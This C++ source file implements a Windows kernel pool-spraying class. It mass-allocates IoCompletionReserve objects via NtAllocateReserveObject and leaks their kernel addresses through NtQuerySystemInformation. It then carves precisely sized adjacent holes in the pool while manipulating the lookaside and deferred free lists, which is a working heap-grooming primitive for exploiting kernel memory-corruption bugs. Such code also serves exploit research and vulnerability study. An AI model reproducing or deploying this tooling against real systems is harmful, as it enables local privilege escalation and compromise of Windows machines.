#include "stdafx.h"
#include "PoolSprayer.h"


NtAllocateReserveObject_t	pNtAllocateReserveObject;


/********************************/
// Default allocator			//
/********************************/
HANDLE defaultAllocator()
{
	HANDLE h;
	NTSTATUS st;

	st = pNtAllocateReserveObject(&h, NULL, IOCO);
	if (!NT_SUCCESS(st))
		throw PoolSprayerException("[-]Failed to allocate on the pool");
	return (h);
}

/****************************/
//	default constructor		//
/****************************/
PoolSprayer::PoolSprayer()
{
	HMODULE h = LoadLibraryA("ntdll.dll");

	if (!h)
	{
		throw PoolSprayerException("[-]Failed to load module");
	}
	pNtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(h, "NtAllocateReserveObject");
	Init(IOCO_SIZE, DEFAULT_MAX_OBJECTS, &defaultAllocator, SOME_HARDCODED_WEIRD_OFFSET);
}


/****************************/
//	Constructor				//
/****************************/
PoolSprayer::PoolSprayer(UINT nObjectSize, UINT nMaxObjects, Allocator_t pAllocator, UINT SomeWeirdOffset)
{
	Init(nObjectSize, nMaxObjects, pAllocator, SomeWeirdOffset);
}

/****************************/
//	Destructor				//
/****************************/
PoolSprayer::~PoolSprayer()
{
	if (m_hObjectTable != NULL)
		freePool();
}

/****************************/
//	Init of the class		//
/****************************/
void PoolSprayer::Init(UINT nObjectSize, UINT nMaxObjects, Allocator_t pAllocator, UINT SomeWeirdOffset)
{
	UINT i = 0;

	m_hObjectTable = new HANDLE[nMaxObjects];
	for (i = 0; i < m_nMaxObjects; i++)
	{
		m_hObjectTable[i] = INVALID_HANDLE_VALUE;
	}

	m_nSomeWeirdOffset = SomeWeirdOffset;
	m_nSingleObjectSize = nObjectSize;
	m_nMaxObjects = nMaxObjects;
	m_nStartIndex = m_nMaxObjects / 2;


	HMODULE h = LoadLibraryA("ntdll.dll");

	if (!h)
	{
		throw PoolSprayerException("[-]Failed to load module");
	}

	m_pNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(h, "NtQuerySystemInformation");
	m_pAllocator = pAllocator;


	if (!m_pAllocator)
	{
		throw PoolSprayerException("[-]The address of the allocator is not valid !");
	}
	if (!m_pNtQuerySystemInformation)
	{
		throw PoolSprayerException("[-]Failed to get the address of NtAllocateReserveObject");
	}
}

/****************************/
//	SprayPool				//
/****************************/
void PoolSprayer::sprayPool()
{
	UINT i = 0;


	for (i = 0; i < m_nMaxObjects; i++)
	{
		m_hObjectTable[i] = m_pAllocator();
	}
}

/****************************/
//	FreePool				//
/****************************/
void PoolSprayer::freePool()
{
	UINT i = 0;
	if (!m_hObjectTable)
		throw PoolSprayerException("[-]The Object Table is null !");

	for (i = 0; i < m_nMaxObjects; i++) {
		if (m_hObjectTable[i] == INVALID_HANDLE_VALUE || !m_hObjectTable[i])
			continue;
		if (!CloseHandle(m_hObjectTable[i]))
			throw PoolSprayerException("[-]Failed to close reserve object handle");
	}
	delete m_hObjectTable;
}

/****************************/
//	create planned Holes	//
/****************************/
void PoolSprayer::createHole(HOLE hole)
{
	if (hole.nHoleSize <= 0)
	{
		throw (PoolSprayerException("[-]Hole size is not valid !"));
	}
	if (!hole.pHandlesToClose)
	{
		throw(PoolSprayerException("[-]Handles Table is null !"));
	}
	if (hole.nHoleSize > 1)
	{
		// filling lookaside list
		closeBunchOfHandles(m_hObjectTable, m_nMaxObjects / 10, m_nMaxObjects / 2, 255, TRUE);
	}
	closeBunchOfHandles(hole.pHandlesToClose, 0, hole.nHoleSize, hole.nHoleSize, FALSE);
	delete hole.pHandlesToClose;
	if (hole.nHoleSize > 1)
	{
		// filling deferred free list
		closeBunchOfHandles(m_hObjectTable, m_nMaxObjects / 10, m_nMaxObjects / 2, 255, TRUE);
	}
}


/****************************/
//	plan Holes				//
/****************************/
HOLE PoolSprayer::planHole(UINT nHoleSize)
{
	UINT i = 0;
	NTSTATUS st;
	PSYSTEM_EXTENDED_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoLen = 0x10000;
	bool IsChunkCorrect = true;
	INT  handleIndex = 0;
	HOLE hole;

	if (nHoleSize == 0)
	{
		throw PoolSprayerException("[-]Hole size is 0 !\n");
	}
	else if (nHoleSize * m_nSingleObjectSize >= 0xFF0)
	{
		throw PoolSprayerException("[-]The hole you're trying to create is too big because it's larger than a page !\n");
	}
	else if (nHoleSize * m_nSingleObjectSize <= 0x200)
	{
		printf("[!]The size of the hole you want to create is <= 0x200 ! Your spraying might not work because of the LookAsideList !\n");
	}
	
	handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)malloc(handleInfoLen);

	hole.nHoleSize = nHoleSize;
	hole.pHandlesToClose = new HANDLE[hole.nHoleSize + 1];

	while ((st = m_pNtQuerySystemInformation(
		SystemExtendedHandleInformation,
		handleInfo,
		handleInfoLen,
		NULL
	)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)realloc(handleInfo, handleInfoLen *= 2);

	if (!NT_SUCCESS(st)) {
		throw PoolSprayerException("[-]NtQuerySystemInformation failed !");
	}

	for (i = m_nStartIndex; i < m_nMaxObjects - 100; i++)
	{
		for (UINT j = 0; j < handleInfo->NumberOfHandles; j++)
		{
			IsChunkCorrect = true;
			if (handleInfo->Handles[j].HandleValue != m_hObjectTable[i])
				IsChunkCorrect = false;
			else
			{
				DWORD64 pTmpBaseAddress = (DWORD64)handleInfo->Handles[j].Object - m_nSomeWeirdOffset;
				for (INT k = -1; k <= (INT)nHoleSize; k++)
				{
					DWORD64 tmpAddress = getObjectAddressWithHandle(m_hObjectTable[i - k]);
					if (tmpAddress == 0)
					{
						IsChunkCorrect = false;
						break;
					}

					tmpAddress -= m_nSomeWeirdOffset;
					if (m_hObjectTable[i - k] == INVALID_HANDLE_VALUE ||
						tmpAddress != (DWORD64)(pTmpBaseAddress + ((INT)(m_nSingleObjectSize * k))) ||
						!(tmpAddress & 0xFFF))
					{
						IsChunkCorrect = false;
						break;
					}
				}
			}
			if (IsChunkCorrect)
			{
				hole.pBaseAddress = (PVOID)((DWORD64)(handleInfo->Handles[j].Object) - m_nSomeWeirdOffset);
				handleIndex = findHandleIndex(handleInfo->Handles[j].HandleValue, m_hObjectTable, m_nMaxObjects);

				for (UINT k = 0; k < nHoleSize; k++)
				{
					hole.pHandlesToClose[k] = m_hObjectTable[handleIndex - k];
					m_hObjectTable[handleIndex - k] = INVALID_HANDLE_VALUE;
				}

				hole.nBaseIndexInOriginalSpray = handleIndex;
				m_nStartIndex = i + 1 + hole.nHoleSize;
				free(handleInfo);
				return (hole);
			}
		}
	}
	free(handleInfo);
	throw PoolSprayerException("[-]Didn't find any valid chunk... Maybe the size of your object or the weird offset is not correct ?\n");
}


/****************************************/
//get Object's address from its handle	//
/****************************************/
DWORD64 PoolSprayer::getObjectAddressWithHandle(HANDLE hObjectHandle, UINT nMaxSearchTry)
{
	NTSTATUS st;
	PSYSTEM_EXTENDED_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoLen = 0x10000;
	DWORD pid = GetCurrentProcessId();

	DWORD64 ret = 0;

	for (UINT j = 0; j < nMaxSearchTry; j++)
	{

		handleInfoLen = 0x10000;
		handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)malloc(handleInfoLen);
		while ((st = m_pNtQuerySystemInformation(
			SystemExtendedHandleInformation,
			handleInfo,
			handleInfoLen,
			NULL
		)) == STATUS_INFO_LENGTH_MISMATCH)
			handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)realloc(handleInfo, handleInfoLen *= 2);


		// NtQuerySystemInformation stopped giving us STATUS_INFO_LENGTH_MISMATCH.
		if (!NT_SUCCESS(st)) {
			throw PoolSprayerException("[-]NtQuerySystemInformation failed !");
			return 0;
		}
		for (UINT i = 0; i < handleInfo->NumberOfHandles; i++)
		{
			if (handleInfo->Handles[i].HandleValue == hObjectHandle && pid == handleInfo->Handles[i].UniqueProcessId)
			{
				ret = ((DWORD64)(handleInfo->Handles[i].Object));
				free(handleInfo);
				return ret;
			}
		}
		free(handleInfo);
	}
	return 0;
}

/****************************************/
//get Object's address from its handle	//
/****************************************/
HANDLE PoolSprayer::getObjectHandleWithAddress(DWORD64 pAddress, UINT nMaxSearchTry)
{
	NTSTATUS st;
	PSYSTEM_EXTENDED_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoLen = 0x10000;
	DWORD pid = GetCurrentProcessId();

	HANDLE ret = INVALID_HANDLE_VALUE;

	for (UINT j = 0; j < nMaxSearchTry; j++)
	{

		handleInfoLen = 0x10000;
		handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)malloc(handleInfoLen);
		while ((st = m_pNtQuerySystemInformation(
			SystemExtendedHandleInformation,
			handleInfo,
			handleInfoLen,
			NULL
		)) == STATUS_INFO_LENGTH_MISMATCH)
			handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)realloc(handleInfo, handleInfoLen *= 2);


		// NtQuerySystemInformation stopped giving us STATUS_INFO_LENGTH_MISMATCH.
		if (!NT_SUCCESS(st)) {
			throw PoolSprayerException("[-]NtQuerySystemInformation failed !");
			return 0;
		}
		for (UINT i = 0; i < handleInfo->NumberOfHandles; i++)
		{
			if ((DWORD64)(handleInfo->Handles[i].Object) == pAddress && pid == handleInfo->Handles[i].UniqueProcessId)
			{
				
				ret = handleInfo->Handles[i].HandleValue;
				free(handleInfo);
				return ret;
			}
		}
		free(handleInfo);
	}
	return INVALID_HANDLE_VALUE;
}

/********************************/
// single object size getter	//
/********************************/
UINT PoolSprayer::getSingleObjectSize()
{
	return(m_nSingleObjectSize); 
}

/********************************/
//	max objects getter			//
/********************************/
UINT PoolSprayer::getMaxObjects()
{
	return(m_nMaxObjects);
}

/********************************/
//	start index getter			//
/********************************/
UINT PoolSprayer::getStartIndex()
{
	return(m_nStartIndex);
}

/********************************/
//	object table getter			//
/********************************/
HANDLE * PoolSprayer::getObjectTable()
{
	return(m_hObjectTable);
}


/********************************/
//	find index with handle		//
/********************************/
int findHandleIndex(HANDLE handle, HANDLE * m_hObjectTable, UINT m_nMaxObjects)
{
	for (UINT i = 0; i < m_nMaxObjects; i++)
	{
		if (m_hObjectTable[i] == handle)
			return i;
	}
	throw PoolSprayerException("[-]Could not find Handle in this ObjectTable");
}


/********************************/
//	close a list of handles		//
/********************************/
void closeBunchOfHandles(HANDLE * m_hObjectTable, UINT startIndex, UINT nMaxIndex, int nNumberOfHandlesToClose, bool avoidCoalescing)
{
	int nClosedHandles = 0;
	int nIncrement = 0;

	if (!m_hObjectTable)
		throw(PoolSprayerException("[-]The Object Table is null. You have to plan the hole !"));

	if (avoidCoalescing)
		nIncrement = 2;
	else
		nIncrement = 1;


	for (UINT i = startIndex; i <= (nMaxIndex - nIncrement); i += nIncrement)
	{
		if (nClosedHandles >= nNumberOfHandlesToClose)
			break;
		if (m_hObjectTable[i] == INVALID_HANDLE_VALUE)
			continue;
		if (!CloseHandle(m_hObjectTable[i]))
			throw PoolSprayerException("[-]Failed to close reserve object handle");
		else
		{
			m_hObjectTable[i] = INVALID_HANDLE_VALUE;
			nClosedHandles++;
		}
	}
	if (nClosedHandles < nNumberOfHandlesToClose)
		throw PoolSprayerException("[-]Couldn't close enough objects... Try using a bigger Object Table ?");
}

